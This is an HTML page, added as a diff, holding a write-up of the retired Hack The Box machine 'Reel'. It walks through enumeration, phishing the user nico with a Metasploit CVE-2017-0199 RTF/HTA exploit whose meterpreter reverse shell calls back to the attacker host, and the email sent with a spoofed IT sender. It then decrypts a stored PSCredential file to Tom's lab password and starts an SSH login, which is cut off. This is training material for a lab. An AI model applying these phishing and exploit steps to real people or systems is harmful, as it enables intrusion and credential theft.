@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Reel | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers FTP (21), SMB (139,445), Phishing leads to user compromise." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-reel/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Reel" /><meta property="og:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers FTP (21), SMB (139,445), Phishing leads to user compromise." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-reel/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-reel/og.png?v=7a7f7634" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Reel" /><meta name="twitter:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers FTP (21), SMB (139,445), Phishing leads to user compromise." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-reel/og.png?v=7a7f7634" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Reel","description":"Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers FTP (21), SMB (139,445), Phishing leads to user compromise.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-reel/","datePublished":"2026-04-09","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Reel","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-reel/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Reel</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-04-09 · 15 min read</p><h1>Reel</h1><p>Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers FTP (21), SMB (139,445), Phishing leads to user compromise.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Reel" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-reel.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-reel.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Reel</h2><p>Reel is medium to hard difficulty machine, which requires a client-side attack to bypass the perimeter, and highlights a technique for gaining privileges in an Active Directory environment.</p></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>Released</dt><dd>23 Jun 2018</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>egre55</dd></div><div><dt>Rating</dt><dd>4.8 / 5</dd></div><div><dt>User owns</dt><dd>4,144</dd></div><div><dt>Root owns</dt><dd>3,499</dd></div><div><dt>User blood</dt><dd>m0noc<small class="room-blood-time">0H 43M 35S</small></dd></div><div><dt>Root blood</dt><dd>phra<small class="room-blood-time">5H 27M 49S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 5079 votes from easiest to hardest"><rect x="0" y="60" width="20" height="4" rx="2" fill="hsl(96 70% 55%)"><title>107 votes</title></rect><rect x="26" y="61" width="20" height="3" rx="2" fill="hsl(96 70% 55%)"><title>79 votes</title></rect><rect x="52" y="50" width="20" height="14" rx="2" fill="hsl(80 70% 55%)"><title>339 votes</title></rect><rect x="78" y="38" width="20" height="26" rx="2" fill="hsl(70 70% 55%)"><title>624 votes</title></rect><rect x="104" y="0" width="20" height="64" rx="2" fill="hsl(50 70% 55%)"><title>1549 votes</title></rect><rect x="130" y="36" width="20" height="28" rx="2" fill="hsl(38 70% 55%)"><title>671 votes</title></rect><rect x="156" y="30" width="20" height="34" rx="2" fill="hsl(28 70% 55%)"><title>830 votes</title></rect><rect x="182" y="43" width="20" height="21" rx="2" fill="hsl(16 70% 55%)"><title>507 votes</title></rect><rect x="208" y="57" width="20" height="7" rx="2" fill="hsl(8 70% 55%)"><title>177 votes</title></rect><rect x="234" y="56" width="20" height="8" rx="2" fill="hsl(0 70% 55%)"><title>196 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 7.2, Real-Life 7.2, CVE 5.9, Custom Exploitation 4.1, CTF-Like 2.8"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,59.6 157.9,94.4 134.3,143.4 93.1,133.2 91.4,103.9" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Reel" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.16.113 --generate-hosts-file /etc/hosts                                                 
+SMB         10.129.16.113   445    REEL             [*] Windows Server 2012 R2 Standard 9600 x64 (name:REEL) (domain:HTB.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)</code></pre><ul><li>Null auth is enabled</li><li>SMBv1</li><li>SMB signing enabled</li></ul><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT -Pn reel.htb.local         
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 11:18 -0400
+Nmap scan report for reel.htb.local (10.129.16.113)
+Host is up (0.014s latency).
+rDNS record for 10.129.16.113: REEL.HTB.LOCAL
+Not shown: 65527 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+25/tcp    open  smtp
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+593/tcp   open  http-rpc-epmap
+49159/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.70 seconds</code></pre><p>Interesting port setup for a windows machine</p><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 21,22,25,135,139,445,593,49159 -A --min-rate=2000 -sT -Pn reel.htb.local
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 11:20 -0400
+Stats: 0:03:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.91% done; ETC: 11:24 (0:00:00 remaining)
+Nmap scan report for reel.htb.local (10.129.16.113)
+Host is up (0.015s latency).
+rDNS record for 10.129.16.113: REEL.HTB.LOCAL
+
+PORT      STATE SERVICE      VERSION
+21/tcp    open  ftp          Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_05-29-18  12:19AM       &lt;DIR&gt;          documents
+22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
+|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
+|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
+25/tcp    open  smtp?
+| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
+|     220 Mail Service ready
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
+|     220 Mail Service ready
+|     sequence of commands
+|     sequence of commands
+|   Hello: 
+|     220 Mail Service ready
+|     EHLO Invalid domain address.
+|   Help: 
+|     220 Mail Service ready
+|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+|   SIPOptions: 
+|     220 Mail Service ready
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|   TerminalServerCookie: 
+|     220 Mail Service ready
+|_    sequence of commands
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49159/tcp open  msrpc        Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2012|2008|7 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
+Aggressive OS guesses: Microsoft Windows Server 2012 R2 (97%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>FTP (21)</h2><p>From the nmap scan i know the service allows anonymous logon</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ftp reel.htb.local                                   
+Connected to REEL.HTB.LOCAL.
+220 Microsoft FTP Service
+Name (reel.htb.local:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||41001|)
+125 Data connection already open; Transfer starting.
+05-29-18  12:19AM       &lt;DIR&gt;          documents
+226 Transfer complete.
+ftp&gt; cd documents 
+250 CWD command successful.
+ftp&gt; dir
+229 Entering Extended Passive Mode (|||41002|)
+125 Data connection already open; Transfer starting.
+05-29-18  12:19AM                 2047 AppLocker.docx
+05-28-18  02:01PM                  124 readme.txt
+10-31-17  10:13PM                14581 Windows Event Forwarding.docx
+226 Transfer complete.</code></pre><p>Ill transfer these files to my machine</p><p>Cant write anywhere here</p><h3>AppLocker.docx</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.</code></pre><h3>readme.txt</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat readme.txt                                                                    
+please email me any rtf format procedures - I&#39;ll review and convert.
+
+new format / converted documents will be saved here.</code></pre><h3>Windows Event Forwarding.docx</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">
+# get winrm config
+
+winrm get winrm/config
+
+
+# gpo config
+
+O:BAG:SYD:(A;;0xf0005;;;SY)(A;;0x5;;;BA)(A;;0x1;;;S-1-5-32-573)(A;;0x1;;;NS)		// add to GPO
+Server=http://WEF.HTB.LOCAL:5985/wsman/SubscriptionManager/WEC,Refresh=60	// add to GPO (60 seconds)
+
+on source computer: gpupdate /force
+
+# prereqs
+
+start Windows Remote Management service on source computer
+add builtin\network service account to &quot;Event Log Readers&quot; group on collector server
+
+# list subscriptions / export
+
+C:\Windows\system32&gt;wecutil es &gt; subs.txt
+
+# check subscription status
+
+C:\Windows\system32&gt;wecutil gr &quot;Account Currently Disabled&quot;
+
+Subscription: Account Currently Disabled
+        RunTimeStatus: Active
+        LastError: 0
+        EventSources:
+                LAPTOP12.HTB.LOCAL
+                        RunTimeStatus: Active
+                        LastError: 0
+                        LastHeartbeatTime: 2017-07-11T13:27:00.920
+
+
+# change pre-rendering setting in multiple subscriptions
+
+for /F &quot;tokens=*&quot; %i in (subs.txt) DO wecutil ss &quot;%i&quot; /cf:Events
+
+
+# export subscriptions to xml
+
+for /F &quot;tokens=*&quot; %i in (subs.txt) DO wecutil gs &quot;%i&quot; /f:xml &gt;&gt; &quot;%i.xml&quot;
+
+# import subscriptions from xml
+
+wecutil cs &quot;Event Log Service Shutdown.xml&quot;
+wecutil cs &quot;Event Log was cleared.xml&quot;
+
+# if get error &quot;The locale specific resource for the desired message is not present&quot;, change subscriptions to Event format (won&#39;t do any hard running command even if they already are in this format)
+
+1.
+
+for /F &quot;tokens=*&quot; %i in (subs.txt) DO wecutil ss &quot;%i&quot; /cf:Events
+
+2.
+
+Under Windows Regional Settings, on the Formats tab, change the format to &quot;English (United States)&quot;
+
+# check subscriptions are being created on the source computer
+
+Event Log: /Applications and Services Logs/Microsoft/Windows/Eventlog-ForwardingPlugin/Operational
+
+
+#### troubleshooting WEF
+
+collector server -&gt; subscription name -&gt; runtime status
+
+gpupdate /force (force checkin, get subscriptions)
+
+check Microsoft/Windows/Eventlog-ForwardingPlugin/Operational for errors
+</code></pre><h2>SMB (139,445)</h2><p>So null auth is enabled but cannot use it to enumerate shares or groups</p><p>Guest account is disabled</p><h2>Phishing leads to user compromise</h2><p>So im thinking that if SMTP is open i might be able to send emails and ive already been given a hint for sending an rtf file for conversion!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">exiftool Windows\ Event\ Forwarding.docx 
+ExifTool Version Number         : 13.50
+File Name                       : Windows Event Forwarding.docx
+Directory                       : .
+File Size                       : 15 kB
+File Modification Date/Time     : 2017:10:31 17:13:23-04:00
+File Access Date/Time           : 2026:04:09 11:26:45-04:00
+File Inode Change Date/Time     : 2026:04:09 11:26:45-04:00
+File Permissions                : -rw-rw-r--
+File Type                       : DOCX
+File Type Extension             : docx
+MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
+Zip Required Version            : 20
+Zip Bit Flag                    : 0x0006
+Zip Compression                 : Deflated
+Zip Modify Date                 : 1980:01:01 00:00:00
+Zip CRC                         : 0x82872409
+Zip Compressed Size             : 385
+Zip Uncompressed Size           : 1422
+Zip File Name                   : [Content_Types].xml
+Creator                         : nico@megabank.com
+Revision Number                 : 4
+Create Date                     : 2017:10:31 18:42:00Z
+Modify Date                     : 2017:10:31 18:51:00Z
+Template                        : Normal.dotm
+Total Edit Time                 : 5 minutes
+Pages                           : 2
+Words                           : 299
+Characters                      : 1709
+Application                     : Microsoft Office Word
+Doc Security                    : None
+Lines                           : 14
+Paragraphs                      : 4
+Scale Crop                      : No
+Heading Pairs                   : Title, 1
+Titles Of Parts                 : 
+Company                         : 
+Links Up To Date                : No
+Characters With Spaces          : 2004
+Shared Doc                      : No
+Hyperlinks Changed              : No
+App Version                     : 14.0000</code></pre><p>Running exiftool on one of the documents i find an email address</p><h3>Ineteracting with SMTP</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">telnet 10.129.16.113 25
+Trying 10.129.16.113...
+Connected to 10.129.16.113.
+Escape character is &#39;^]&#39;.
+220 Mail Service ready
+HELO dmuhackers.com
+250 Hello.
+MAIL FROM: &lt;ethan@dmuhackers.com&gt;
+250 OK
+RCPT TO: &lt;nico@megabank.com&gt;
+250 OK</code></pre><p>Looks to be a valid email address</p><p>After doing some research on RTF phishing exploits i find metasploit has a module for the associated CVE <code>CVE-2017-0199</code></p><h2>Meterpreter session as <code>nico</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">msf exploit(windows/fileformat/office_word_hta) &gt; options
+
+Module options (exploit/windows/fileformat/office_word_hta):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   FILENAME  msf.doc          yes       The file name.
+   SRVHOST   10.10.14.90      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT   8080             yes       The local port to listen on.
+   SRVSSL    false            no        Negotiate SSL/TLS for local server connections
+   SSL       false            no        Negotiate SSL for incoming connections
+   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH   default.hta      yes       The URI to use for the HTA file
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     10.10.14.90      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Office Word
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(windows/fileformat/office_word_hta) &gt; run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf exploit(windows/fileformat/office_word_hta) &gt; 
+[*] Started reverse TCP handler on 10.10.14.90:4444 
+[+] msf.doc stored at /home/kali/.msf4/local/msf.doc
+[*] Using URL: http://10.10.14.90:8080/default.hta
+[*] Server started.</code></pre><p>Ive configured metasploit with an lhost and lport to connect back to and also set the srvhost to my ip where the malicious attachment will be hosted!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sendEmail -f IT@megabank.com -t nico@megabank.com -a /home/kali/.msf4/local/msf.doc -u &#39;Urgent Action Required!&#39; -m &#39;Please find attached document for more details!&#39; -s 10.129.16.113
+Apr 09 11:59:28 kali sendEmail[81454]: Email was sent successfully!</code></pre><p>This has sent the emai</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">msf exploit(windows/fileformat/office_word_hta) &gt; run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf exploit(windows/fileformat/office_word_hta) &gt; 
+[*] Started reverse TCP handler on 10.10.14.90:4444 
+[+] msf.doc stored at /home/kali/.msf4/local/msf.doc
+[*] Using URL: http://10.10.14.90:8080/default.hta
+[*] Server started.
+[*] Sending stage (196678 bytes) to 10.129.16.113
+[*] Meterpreter session 1 opened (10.10.14.90:4444 -&gt; 10.129.16.113:50282) at 2026-04-09 11:59:43 -0400</code></pre><p>Now i have a meterpreter session as <code>nico</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">msf exploit(windows/fileformat/office_word_hta) &gt; sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter &gt; getuid
+Server username: HTB\nico
+meterpreter &gt; </code></pre><p>Shell as <code>nico</code></p><p>From here i can get the user flag at <code>C:\Users\nico\Desktop</code></p><h2>Compromising <code>Tom</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat cred.xml  
+��&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;
+  &lt;Obj RefId=&quot;0&quot;&gt;
+    &lt;TN RefId=&quot;0&quot;&gt;
+      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
+      &lt;T&gt;System.Object&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;S N=&quot;UserName&quot;&gt;HTB\Tom&lt;/S&gt;
+      &lt;SS N=&quot;Password&quot;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692&lt;/SS&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;</code></pre><p>Found a file inside <code>nico</code> desktop called <code>cred.xml</code></p><p>Referenced in the file <code>pscredential</code> tells me this could be using <code>Import-CliXml</code> and <code>Export-CliXml</code> which means i can use those to retrieve the plaintext password</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">C:\Users\nico\Desktop&gt;powershell -c &quot;$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *&quot;
+powershell -c &quot;$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *&quot;
+
+
+UserName       : Tom
+Password       : 1ts-mag1c!!!
+SecurePassword : System.Security.SecureString
+Domain         : HTB</code></pre><p>Found a password!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb reel.htb.local -u &#39;tom&#39; -p &#39;1ts-mag1c!!!&#39;   
+SMB         10.129.16.113   445    REEL             [*] Windows Server 2012 R2 Standard 9600 x64 (name:REEL) (domain:HTB.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.16.113   445    REEL             [+] HTB.LOCAL\tom:1ts-mag1c!!!</code></pre><p>This user is compromised</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ssh reel.htb.local -u &#39;tom&#39; -p &#39;1ts-mag1c!!!&#39;     
+SSH         10.129.16.113   22     reel.htb.local   [*] SSH-2.0-OpenSSH_7.6
+SSH         10.129.16.113   22     reel.htb.local   [+] tom:1ts-mag1c!!!  Windows - Shell access!</code></pre><p>This user has access over SSH</p><h3>SSH access as <code>tom</code></h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ssh tom@reel.htb.local                        
+The authenticity of host &#39;reel.htb.local (10.129.16.113)&#39; can&#39;t be established.
+ED25519 key fingerprint is: SHA256:fIZnS9nEVF3o86fEm/EKspTgedBr8TvFR0i3Pzk40EQ
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;reel.htb.local&#39; (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+tom@reel.htb.local&#39;s password: 
+
